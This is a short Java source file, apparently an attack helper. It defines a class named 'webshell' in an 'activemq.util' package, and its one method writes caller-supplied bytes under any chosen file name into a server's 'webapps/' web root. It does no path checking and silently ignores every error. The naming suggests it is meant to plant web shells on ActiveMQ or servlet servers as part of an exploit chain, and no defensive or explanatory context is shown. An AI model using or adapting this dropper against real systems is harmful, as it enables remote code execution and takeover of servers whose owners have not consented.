package activemq.util;

import java.io.File;
import java.io.FileOutputStream;

public class webshell {

    public void test(byte[] str,String fileName){
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(new
                    File("webapps/"+ fileName));
            fileOutputStream.write(str);
            fileOutputStream.close();
        } catch (Exception e){}
    }
}